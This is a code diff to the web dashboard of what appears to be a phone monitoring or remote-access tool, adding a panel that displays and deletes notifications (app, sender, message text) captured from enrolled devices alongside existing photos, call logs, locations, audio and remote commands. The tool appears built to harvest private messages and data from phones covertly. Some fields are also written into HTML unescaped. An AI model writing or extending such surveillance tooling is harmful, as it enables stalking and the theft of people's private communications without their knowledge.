@@ -41,6 +41,7 @@ function initNav() {
 
       if (btn.dataset.section === 'stats') refreshStats();
       if (btn.dataset.section === 'calllogs') refreshCallLogs();
+      if (btn.dataset.section === 'notifications') refreshNotifications();
       if (btn.dataset.section === 'photos') refreshPhotos();
       if (btn.dataset.section === 'commands') refreshAllCommands();
 
@@ -100,6 +101,9 @@ function connectWS() {
       }
       if (msg.type === 'audio_frame') {
         pendingAudioFrame = { sample_rate: msg.sample_rate || 16000, channels: msg.channels || 1 };
+      }
+      if (msg.type === 'notification') {
+        handleLiveNotification(msg);
       }
     } catch (err) {}
   };
@@ -162,6 +166,7 @@ async function refreshStats() {
 
     document.getElementById('storageStats').innerHTML = `
       <div class="stat-card"><div class="stat-number">${stats.devices}</div><div class="stat-label">Devices</div></div>
+      <div class="stat-card"><div class="stat-number">${stats.notifications || 0}</div><div class="stat-label">Notifications</div></div>
       <div class="stat-card"><div class="stat-number">${stats.photos}</div><div class="stat-label">Photos</div></div>
       <div class="stat-card"><div class="stat-number">${stats.call_logs}</div><div class="stat-label">Call Logs</div></div>
       <div class="stat-card"><div class="stat-number">${stats.locations}</div><div class="stat-label">Locations</div></div>
@@ -170,6 +175,7 @@ async function refreshStats() {
 
     document.getElementById('sidebarStats').innerHTML = `
       <div class="stat-item"><span>Devices</span><span>${stats.devices}</span></div>
+      <div class="stat-item"><span>Notifications</span><span>${stats.notifications || 0}</span></div>
       <div class="stat-item"><span>Photos</span><span>${stats.photos}</span></div>
       <div class="stat-item"><span>Call Logs</span><span>${stats.call_logs}</span></div>
     `;
@@ -220,6 +226,7 @@ function selectDevice(deviceId) {
   loadDeviceLocation(deviceId);
   loadDevicePhotos(deviceId);
   loadDeviceLocations(deviceId);
+  loadDeviceNotifications(deviceId);
 
   closeSidebar();
 }
@@ -582,12 +589,13 @@ async function deleteDeviceLocations() {
 
 async function deleteAllDeviceData() {
   if (!selectedDevice) return;
-  showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, and commands for this device. Continue?', async () => {
+  showConfirm('Delete All Device Data', 'This will delete ALL photos, call logs, locations, notifications, and commands for this device. Continue?', async () => {
     try {
       await fetch(`${API_BASE}/api/device/${selectedDevice}/photos`, { method: 'DELETE' });
       await fetch(`${API_BASE}/api/device/${selectedDevice}/calllogs`, { method: 'DELETE' });
       await fetch(`${API_BASE}/api/device/${selectedDevice}/locations`, { method: 'DELETE' });
       await fetch(`${API_BASE}/api/device/${selectedDevice}/commands`, { method: 'DELETE' });
+      await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
       showToast('All device data deleted');
       showDeviceList();
       refreshDevices();
@@ -675,6 +683,126 @@ async function nukeAllData() {
       showToast('Delete failed', true);
     }
   });
+}
+
+// ===== Notifications =====
+function handleLiveNotification(msg) {
+  showToast(`[${msg.app_name}] ${msg.sender}: ${msg.message.substring(0, 60)}`);
+
+  if (document.getElementById('sec-notifications')?.classList.contains('active')) {
+    refreshNotifications();
+  }
+}
+
+async function refreshNotifications() {
+  const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+  let allNotifs = [];
+
+  for (const d of devices) {
+    const notifs = await fetch(`${API_BASE}/api/device/${d.id}/notifications`).then(r => r.json());
+    allNotifs.push(...notifs.map(n => ({ ...n, device_name: d.device_name || d.id.substring(0, 12) })));
+  }
+
+  allNotifs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+  const container = document.getElementById('notifList');
+  if (allNotifs.length === 0) {
+    container.innerHTML = '<div class="empty-state">No notifications captured yet. Enable Notification Access on the device.</div>';
+    return;
+  }
+
+  container.innerHTML = `
+    <table>
+      <thead><tr><th>Device</th><th>App</th><th>Sender</th><th>Message</th><th>Time</th><th></th></tr></thead>
+      <tbody>
+        ${allNotifs.slice(0, 200).map(n => `
+          <tr>
+            <td>${n.device_name}</td>
+            <td><strong>${n.app_name || n.app_package}</strong></td>
+            <td>${n.sender || '-'}</td>
+            <td style="max-width:400px;white-space:pre-wrap;word-break:break-word">${escapeHtml(n.message || '')}</td>
+            <td>${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
+            <td><button class="row-delete" onclick="deleteNotification('${n.id}')">Delete</button></td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+}
+
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+async function deleteNotification(notifId) {
+  try {
+    await fetch(`${API_BASE}/api/notifications/${notifId}`, { method: 'DELETE' });
+    refreshNotifications();
+  } catch (e) {
+    showToast('Delete failed', true);
+  }
+}
+
+async function clearAllNotifications() {
+  showConfirm('Clear All Notifications', 'Delete all captured notifications for ALL devices?', async () => {
+    try {
+      const devices = await fetch(`${API_BASE}/api/devices`).then(r => r.json());
+      for (const d of devices) {
+        await fetch(`${API_BASE}/api/device/${d.id}/notifications`, { method: 'DELETE' });
+      }
+      showToast('All notifications cleared');
+      refreshNotifications();
+      refreshStats();
+    } catch (e) {
+      showToast('Clear failed', true);
+    }
+  });
+}
+
+// ===== Device Notifications (in detail panel) =====
+async function loadDeviceNotifications(deviceId) {
+  try {
+    const res = await fetch(`${API_BASE}/api/device/${deviceId}/notifications`);
+    const notifs = await res.json();
+
+    const container = document.getElementById('deviceNotifications');
+    if (notifs.length === 0) {
+      container.innerHTML = '<div class="empty-state">No notifications captured.</div>';
+      return;
+    }
+
+    container.innerHTML = `
+      <table>
+        <thead><tr><th>App</th><th>Sender</th><th>Message</th><th>Time</th></tr></thead>
+        <tbody>
+          ${notifs.slice(0, 50).map(n => `
+            <tr>
+              <td><strong>${n.app_name || n.app_package}</strong></td>
+              <td>${n.sender || '-'}</td>
+              <td style="max-width:400px;white-space:pre-wrap;word-break:break-word">${escapeHtml(n.message || '')}</td>
+              <td>${n.timestamp ? new Date(n.timestamp).toLocaleString() : '-'}</td>
+            </tr>
+          `).join('')}
+        </tbody>
+      </table>
+    `;
+  } catch (e) {
+    console.error('Failed to load notifications:', e);
+  }
+}
+
+async function deleteDeviceNotifications() {
+  if (!selectedDevice) return;
+  try {
+    await fetch(`${API_BASE}/api/device/${selectedDevice}/notifications`, { method: 'DELETE' });
+    showToast('Notifications cleared');
+    loadDeviceNotifications(selectedDevice);
+    refreshStats();
+  } catch (e) {
+    showToast('Delete failed', true);
+  }
 }
 
 // ===== Toast =====
